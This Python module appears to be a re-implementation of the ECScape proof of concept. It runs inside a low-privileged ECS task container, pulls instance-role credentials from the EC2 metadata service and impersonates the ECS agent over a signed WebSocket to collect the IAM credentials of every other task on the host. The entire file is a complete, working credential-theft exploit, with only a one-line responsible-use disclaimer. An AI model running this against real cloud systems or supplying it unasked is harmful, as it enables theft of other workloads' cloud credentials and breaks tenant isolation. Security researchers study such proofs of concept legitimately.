"""
ECScape in-container payload  (Python re-implementation of naorhaziz/ecscape)
=============================================================================
This module runs *inside* a low-privileged ECS-on-EC2 task container (host
network mode).  It impersonates the ECS agent to harvest the IAM credentials of
every other task on the same container instance, breaking task isolation.

Chain (mirrors the upstream Rust PoC):
  1. IMDS  (169.254.169.254)      -> instance-role creds + local-ipv4 + region
  2. Agent introspection          -> http://<local-ip>:51678/v1/metadata
                                      (cluster, containerInstanceArn, agent ver/hash)
  3. ecs:DiscoverPollEndpoint      -> the ACS control-plane endpoint
  4. SigV4-signed WebSocket        -> wss://<acs>/ws?...&sendCredentials=true
                                      AWS treats us as the real agent and streams
                                      IAMRoleCredentials for every task on the host.

The heavy runtime dependencies (requests / websocket-client) are imported lazily
inside the functions that need them, so the pure helpers below import with the
standard library alone and can be unit-tested without AWS or extra packages.

Run responsibly.  Only against accounts/instances you own.
"""
from __future__ import annotations

import json
import re
from typing import Any, Optional

# ── Constants ───────────────────────────────────────────────────────────────
IMDS_BASE = "http://169.254.169.254"
INTROSPECTION_PORT = 51678
ACS_PROTOCOL_VERSION = "1"
ACS_PROTOCOL_SEQ_NUM = "1"

# "Amazon ECS Agent - v1.97.0 (*e1234567)"  ->  ver=1.97.0  hash=e1234567
_VERSION_RE = re.compile(r"v(?P<ver>[\d.]+)\s+\(\*(?P<hash>[a-fA-F0-9]+)\)")
_ARN_RE = re.compile(
    r"^arn:aws:ecs:(?P<region>[^:]+):(?P<account_id>\d+):container-instance/.+$"
)


# ── Pure helpers (stdlib only — unit-tested) ────────────────────────────────
def parse_agent_version(version_str: str) -> tuple[str, str]:
    """Extract (version, hash) from the agent introspection Version string."""
    m = _VERSION_RE.search(version_str or "")
    if not m:
        raise ValueError(f"cannot parse agent version string: {version_str!r}")
    return m.group("ver"), m.group("hash")


def build_cluster_arn(container_instance_arn: str, cluster_name: str) -> str:
    """Derive the cluster ARN from the container-instance ARN + short cluster name.

    The introspection endpoint returns the cluster as a short *name*; ACS wants a
    full ARN.  Region/account come from the container-instance ARN (same as the
    upstream PoC's ECSAgentMetadata deserializer).
    """
    m = _ARN_RE.match(container_instance_arn or "")
    if not m:
        raise ValueError(
            f"cannot parse container-instance ARN: {container_instance_arn!r}"
        )
    region, account_id = m.group("region"), m.group("account_id")
    # Already an ARN?  Pass it through.
    if cluster_name.startswith("arn:aws:ecs:"):
        return cluster_name
    return f"arn:aws:ecs:{region}:{account_id}:cluster/{cluster_name}"


def build_acs_ws_url(
    poll_endpoint: str,
    cluster_arn: str,
    container_instance_arn: str,
    agent_version: str,
    agent_hash: str,
    send_credentials: bool = True,
) -> str:
    """Build the ACS WebSocket URL that impersonates the agent.

    Mirrors ecscape/src/protocols/acs/request_builder.rs — http->ws, https->wss,
    path gets '/ws', and the query carries sendCredentials=true so the control
    plane pushes every task's credentials on connect.
    """
    from urllib.parse import urlencode, urlsplit, urlunsplit

    parts = urlsplit(poll_endpoint)
    scheme = {"http": "ws", "https": "wss"}.get(parts.scheme, parts.scheme)
    path = parts.path or ""
    path = f"{path}ws" if path.endswith("/") else f"{path}/ws"
    query = urlencode(
        {
            "agentHash": agent_hash,
            "agentVersion": agent_version,
            "clusterArn": cluster_arn,
            "containerInstanceArn": container_instance_arn,
            "protocolVersion": ACS_PROTOCOL_VERSION,
            "seqNum": ACS_PROTOCOL_SEQ_NUM,
            "sendCredentials": "true" if send_credentials else "false",
        }
    )
    return urlunsplit((scheme, parts.netloc, path, query, ""))


def _iam_creds(obj: dict) -> Optional[dict]:
    """Normalise an ACS IAMRoleCredentials struct to a flat dict, or None."""
    if not obj:
        return None
    ak = obj.get("accessKeyId")
    sk = obj.get("secretAccessKey")
    if not ak or not sk:
        return None
    return {
        "credentials_id": obj.get("credentialsId"),
        "access_key_id": ak,
        "secret_access_key": sk,
        "session_token": obj.get("sessionToken"),
        "role_arn": obj.get("roleArn"),
        "expiration": obj.get("expiration"),
    }


def extract_credentials(message: dict) -> list[dict]:
    """Pull every IAM credential out of a decoded ACS message.

    Handles both delivery shapes the upstream handler reacts to:
      * PayloadMessage  -> tasks[].roleCredentials / .executionRoleCredentials
      * IAMRoleCredentialsMessage / RefreshCredentialsMessage -> .roleCredentials
    Each result is tagged with task_arn + role_type for reporting.
    """
    mtype = message.get("type")
    body = message.get("message", {}) or {}
    out: list[dict] = []

    if mtype in ("IAMRoleCredentialsMessage", "RefreshCredentialsMessage"):
        creds = _iam_creds(body.get("roleCredentials", {}))
        if creds:
            creds["task_arn"] = body.get("taskArn")
            creds["role_type"] = body.get("roleType", "task")
            out.append(creds)

    elif mtype == "PayloadMessage":
        for task in body.get("tasks") or []:
            task_arn = task.get("arn")
            for field, rtype in (
                ("roleCredentials", "task"),
                ("executionRoleCredentials", "execution"),
            ):
                creds = _iam_creds(task.get(field, {}))
                if creds:
                    creds["task_arn"] = task_arn
                    creds["role_type"] = rtype
                    out.append(creds)
    return out


def ack_for(message: dict) -> Optional[dict]:
    """Return the ACS ack message to send for a received message, or None.

    Acking keeps the ACS session alive exactly like a real agent; without the
    heartbeat acks the control plane closes the connection.  Mirrors the match
    arms in ecscape/src/protocols/acs/handler.rs.
    """
    mtype = message.get("type")
    body = message.get("message", {}) or {}
    mid = body.get("messageId")

    if mtype == "HeartbeatMessage":
        return {"type": "HeartbeatAckRequest", "message": {"messageId": mid}}

    if mtype in (
        "PayloadMessage",
        "AttachTaskNetworkInterfacesMessage",
        "AttachInstanceNetworkInterfacesMessage",
        "ConfirmAttachmentMessage",
        "TaskManifestMessage",
    ):
        return {
            "type": "AckRequest",
            "message": {
                "messageId": mid,
                "cluster": body.get("clusterArn"),
                "containerInstance": body.get("containerInstanceArn"),
            },
        }

    if mtype in ("IAMRoleCredentialsMessage", "RefreshCredentialsMessage"):
        creds = body.get("roleCredentials", {}) or {}
        return {
            "type": "IAMRoleCredentialsAckRequest",
            "message": {
                "messageId": mid,
                "credentialsId": creds.get("credentialsId"),
                "expiration": creds.get("expiration"),
            },
        }
    return None


# ── SigV4 WebSocket signing (needs botocore, which is always present) ───────
def sign_ws_headers(ws_url: str, region: str, creds: dict) -> dict:
    """SigV4-sign a GET to the ACS URL (service 'ecs') and return auth headers.

    Reproduces ecscape/src/protocols/request_builder.rs: sign an empty-body GET
    to the wss URL as service 'ecs' with the stolen *instance* credentials, then
    carry the resulting SigV4 headers on the WebSocket upgrade request.
    """
    from botocore.auth import SigV4Auth
    from botocore.awsrequest import AWSRequest
    from botocore.credentials import Credentials

    # botocore canonicalises over http(s); host + path + query are what matter.
    sign_url = ws_url.replace("wss://", "https://", 1).replace("ws://", "http://", 1)
    boto_creds = Credentials(
        access_key=creds["access_key_id"],
        secret_key=creds["secret_access_key"],
        token=creds.get("session_token"),
    )
    req = AWSRequest(method="GET", url=sign_url)
    SigV4Auth(boto_creds, "ecs", region).add_auth(req)
    # Only the SigV4 headers — websocket-client sets Host / Sec-WebSocket-* itself.
    keys = ("Authorization", "X-Amz-Date", "X-Amz-Security-Token", "X-Amz-Content-SHA256")
    return {k: v for k, v in req.headers.items() if k in keys}


# ── Runtime steps (lazy imports; exercised live, not in unit tests) ─────────
def _http_get(url: str, headers: Optional[dict] = None, timeout: int = 5) -> "Any":
    import requests

    r = requests.get(url, headers=headers or {}, timeout=timeout)
    r.raise_for_status()
    return r


def imds_instance_metadata() -> dict:
    """Steal the instance-role creds + local IP + region from IMDS (v2, v1 fallback)."""
    import requests

    token_headers = {}
    try:  # IMDSv2
        t = requests.put(
            f"{IMDS_BASE}/latest/api/token",
            headers={"X-aws-ec2-metadata-token-ttl-seconds": "60"},
            timeout=5,
        )
        if t.ok:
            token_headers = {"X-aws-ec2-metadata-token": t.text}
    except requests.RequestException:
        pass

    def g(path: str) -> str:
        return _http_get(f"{IMDS_BASE}/{path}", headers=token_headers).text

    local_ip = g("latest/meta-data/local-ipv4").strip()
    region = g("latest/meta-data/placement/region").strip()
    role = g("latest/meta-data/iam/security-credentials/").strip()
    creds = json.loads(g(f"latest/meta-data/iam/security-credentials/{role}"))
    return {
        "local_ip": local_ip,
        "region": region,
        "role_name": role,
        "access_key_id": creds["AccessKeyId"],
        "secret_access_key": creds["SecretAccessKey"],
        "session_token": creds["Token"],
    }


def agent_introspection(local_ip: str) -> dict:
    """Read the ECS agent introspection endpoint for the container-instance identity.

    Upstream targets the host ENI IP; some agent versions bind the introspection
    server to loopback only, which is still reachable from a host-network task at
    127.0.0.1, so fall back to that.
    """
    import requests

    meta = None
    last_exc: Exception | None = None
    for host in (local_ip, "127.0.0.1"):
        try:
            meta = _http_get(f"http://{host}:{INTROSPECTION_PORT}/v1/metadata").json()
            break
        except requests.RequestException as exc:
            last_exc = exc
    if meta is None:
        raise RuntimeError(f"agent introspection unreachable on :{INTROSPECTION_PORT} ({last_exc})")
    ci_arn = meta["ContainerInstanceArn"]
    version, agent_hash = parse_agent_version(meta.get("Version", ""))
    return {
        "cluster_arn": build_cluster_arn(ci_arn, meta["Cluster"]),
        "container_instance_arn": ci_arn,
        "agent_version": version,
        "agent_hash": agent_hash,
    }


def discover_poll_endpoint(instance: dict, agent: dict) -> str:
    """Call ecs:DiscoverPollEndpoint with the stolen instance creds."""
    import boto3

    ecs = boto3.client(
        "ecs",
        region_name=instance["region"],
        aws_access_key_id=instance["access_key_id"],
        aws_secret_access_key=instance["secret_access_key"],
        aws_session_token=instance["session_token"],
    )
    resp = ecs.discover_poll_endpoint(
        cluster=agent["cluster_arn"],
        containerInstance=agent["container_instance_arn"],
    )
    return resp["endpoint"]


def harvest(instance: dict, agent: dict, poll_endpoint: str, idle_timeout: int = 25) -> list[dict]:
    """Open the forged ACS WebSocket and collect credentials until it goes idle."""
    import websocket  # websocket-client

    ws_url = build_acs_ws_url(
        poll_endpoint,
        agent["cluster_arn"],
        agent["container_instance_arn"],
        agent["agent_version"],
        agent["agent_hash"],
    )
    headers = sign_ws_headers(ws_url, instance["region"], instance)
    header_list = [f"{k}: {v}" for k, v in headers.items()]

    print(f"[*] Connecting to ACS: {ws_url.split('?')[0]}?...&sendCredentials=true")
    ws = websocket.create_connection(ws_url, header=header_list, timeout=idle_timeout)

    collected: dict[str, dict] = {}
    try:
        while True:
            try:
                raw = ws.recv()
            except websocket.WebSocketTimeoutException:
                break  # gone idle — we have what the host was streaming
            if not raw:
                break
            try:
                msg = json.loads(raw)
            except (ValueError, TypeError):
                continue

            ack = ack_for(msg)
            if ack:
                try:
                    ws.send(json.dumps(ack))
                except Exception:
                    pass

            for cred in extract_credentials(msg):
                key = cred.get("role_arn") or f"{cred.get('task_arn')}:{cred.get('role_type')}"
                collected[key] = cred
                print(
                    f"[+] Harvested {cred.get('role_type')} creds "
                    f"role={cred.get('role_arn')} task={cred.get('task_arn')}"
                )
    finally:
        try:
            ws.close()
        except Exception:
            pass
    return list(collected.values())


def run_payload() -> dict:
    """Full in-container chain.  Returns a JSON-serialisable result dict."""
    result: dict[str, Any] = {"ok": False, "steps": {}, "credentials": []}
    try:
        instance = imds_instance_metadata()
        result["steps"]["imds"] = {
            "region": instance["region"],
            "local_ip": instance["local_ip"],
            "instance_role": instance["role_name"],
        }
        print(f"[+] Stole instance-role creds via IMDS (role={instance['role_name']})")

        agent = agent_introspection(instance["local_ip"])
        result["steps"]["introspection"] = agent
        print(f"[+] Agent introspection: {agent['container_instance_arn']}")

        poll_endpoint = discover_poll_endpoint(instance, agent)
        result["steps"]["poll_endpoint"] = poll_endpoint
        print(f"[+] DiscoverPollEndpoint -> {poll_endpoint}")

        creds = harvest(instance, agent, poll_endpoint)
        # Redact secrets in the returned/logged result; keep identity + key id.
        result["credentials"] = [
            {
                "role_arn": c.get("role_arn"),
                "role_type": c.get("role_type"),
                "task_arn": c.get("task_arn"),
                "access_key_id": c.get("access_key_id"),
                "expiration": c.get("expiration"),
            }
            for c in creds
        ]
        result["ok"] = bool(creds)
    except Exception as exc:  # noqa: BLE001 - report, don't crash the container
        result["error"] = f"{type(exc).__name__}: {exc}"
        print(f"[!] payload error: {result['error']}")
    return result


if __name__ == "__main__":  # executed inside the attacker container
    out = run_payload()
    # Sentinel-wrapped JSON so attack.py can pluck the result out of container logs.
    print("ECSCAPE_RESULT_BEGIN" + json.dumps(out) + "ECSCAPE_RESULT_END")
